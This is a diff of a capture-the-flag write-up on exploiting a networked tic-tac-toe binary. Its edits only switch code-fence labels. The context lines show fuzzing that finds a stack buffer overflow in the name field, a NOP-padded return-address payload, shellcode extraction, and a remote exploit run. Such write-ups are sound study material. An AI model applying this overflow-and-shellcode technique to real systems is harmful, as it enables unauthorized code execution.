@@ -7,7 +7,7 @@ Notes:
 ## Enumeration
 In this task we are given two files:
 
-```bash
+```console
 $ ls
 tictactoe server.py
 
@@ -182,7 +182,7 @@ Let's then leave a server.py for now and let's look for vulnerabilities inside t
 
 Start the server.py in first tab:
 
-```bash
+```console
 $ python3 server.py 
 [+] Server started at 127.0.0.1:9998
 
@@ -190,7 +190,7 @@ $ python3 server.py
 
 Then start tictactoe in second tab:
 
-```bash
+```console
 $ ./tictactoe
 [-] Error resolving server hostname in send_reg_user()
 $
@@ -198,7 +198,7 @@ $
 
 And we immediately got an error. Let's investigate it using ltrace (which will display all library calls application performs)
 
-```bash
+```console
 $ ltrace ./tictactoe
 gethostbyname("task2-tictactoe-backend")                                                                                      = 0
 puts("[-] Error resolving server hostn"...[-] Error resolving server hostname in send_reg_user()
@@ -209,7 +209,7 @@ _exit(7 <no return ...>
 
 Nice :) The tictactoe needs to get an address of server.py. And it get's it from /etc/hosts file. So just add a new record to your etc/hosts:
 
-```bash
+```console
 $ cat vim /etc/hosts
 [...]
 127.0.0.1 task2-tictactoe-backend
@@ -218,7 +218,7 @@ $ cat vim /etc/hosts
 
 Let's try to run the app again:
 
-```bash
+```console
 $ ./tictactoe
 [+] TCP server started as 0.0.0.0:8889
 
@@ -226,7 +226,7 @@ $ ./tictactoe
 
 Hurray! Now we can connect to our proxy with netcat just as we did before but instead of `pwn-tictactoe.ctfz.one` we specify `127.0.0.1` as host. We can observe the whole flow now, add debug information to server.py file or observe tictactoe server under gdb!
 
-```bash
+```console
 $ nc 127.0.0.1 8889
 Welcome to tictactoe game! Please, enter your name: Ala
                                                                      
@@ -247,7 +247,7 @@ Welcome to tictactoe game! Please, enter your name: Ala
 
 And in the server.py tab we can see that the tictactoe propagetad the name to server.py which assigned new session to user:
 
-```bash
+```console
 $ python3 server.py 
 [+] Server started at 127.0.0.1:9998
 [+] Sending session info: b'01000000313355454c524f48544f6c636b68646b6e3236367966684e525253583632306d' (1, b'13UELROHTOlckhdkn266yfhNRRSX620m')
@@ -256,7 +256,7 @@ $ python3 server.py
 ## Manual fuzzing
 Now we can start fuzzing the tictactoe app! Let's start with providing invalid arguments as move:
 
-```bash
+```console
 $ nc 127.0.0.1 8889
 Welcome to tictactoe game! Please, enter your name: Ala
 
@@ -289,7 +289,7 @@ Please, enter only free cell number (1-9):0
 
 No crashes or output in tictactoe tab. This means that the game performs at least some checks for the moves. I've decided to move on and checked the second input which is username.
 
-```bash
+```console
 $ nc 127.0.0.1 8889
 Welcome to tictactoe game! Please, enter your name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaah
 ```
@@ -308,7 +308,7 @@ $ dmesg | tail -1
 We just found the most basic buffer overflow! Moreover we haven't seen  "__stack_ch_fail" alert, so the binary perhaps is not well protected.
 We can confirm that by using checksec command:
 
-```bash
+```console
 $ checksec tictactoe
 [*] './tictactoe'
     Arch:     amd64-64-little
@@ -391,7 +391,7 @@ So the next idea that popped into my mind was to jump to `name`. It is a global 
 
 `payload = b'\x90' * 88 + p64(e.symbols['name']) + b'\x90' * 100`
 
-``` bash
+``` console
 $ gdb ./tictactoe
 gef➤  b *0x4016b3 ; break at ret from get_name
 gef➤  r
@@ -660,7 +660,7 @@ _send_flag:
 
 We can now extract it:
 
-```bash
+```console
 $ nasm -f elf64 1_shellcode.asm -o 1_shellcode.o
 
 $ for i in `objdump -d 1_shellcode.o |grep "^ " |cut -f2`; do echo -n '\x'$i; done; echo
@@ -669,7 +669,7 @@ $ for i in `objdump -d 1_shellcode.o |grep "^ " |cut -f2`; do echo -n '\x'$i; do
 
 And test our [exploit](exp.py)
 
-```bash
+```console
 $ python3 exp.py remote
 [*] '/home/k/cz/tictactoe_files/tictactoe'
     Arch:     amd64-64-little
